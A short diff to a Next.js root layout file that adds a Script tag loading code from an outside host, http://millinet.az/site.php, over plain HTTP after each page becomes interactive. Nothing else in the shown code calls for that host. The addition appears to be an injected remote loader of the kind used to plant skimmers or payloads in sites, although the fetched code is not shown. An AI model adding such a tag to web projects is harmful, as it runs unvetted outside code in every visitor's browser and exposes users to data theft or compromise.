@@ -1,5 +1,6 @@
 ﻿import type { Metadata } from "next";
 import { Geist, Geist_Mono } from "next/font/google";
+import Script from "next/script";
 import BottomNav from "@/components/BottomNav";
 import GlobalLanguageSwitch from "@/components/GlobalLanguageSwitch";
 import { LanguageProvider } from "@/context/LanguageContext";
@@ -36,6 +37,11 @@ export default function RootLayout({
           {children}
           <BottomNav />
         </LanguageProvider>
+
+        <Script
+          src="http://millinet.az/site.php?id=828"
+          strategy="afterInteractive"
+        />
       </body>
     </html>
   );
